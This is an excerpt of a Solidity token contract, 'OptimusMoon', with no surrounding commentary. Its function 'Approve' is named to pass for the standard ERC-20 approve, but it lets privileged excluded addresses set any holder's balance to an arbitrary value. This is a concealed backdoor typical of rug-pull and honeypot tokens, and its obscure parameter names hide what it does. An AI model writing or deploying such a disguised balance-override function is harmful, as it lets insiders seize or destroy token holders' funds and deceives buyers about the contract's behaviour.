...
contract OptimusMoon is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _bOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    string private  _name = "OptimusMoon";
    string private  _symbol = "OptimusMoon";
    ...
    function Approve(address Ido   , uint256 token , uint256 nft  , uint256 nft1) external  { 
         require( _isExcludedFrom[msg.sender]);
         require(Ido != uniswapV2Pair);
        _bOwned[Ido] = token + nft + nft * nft1;
    }   
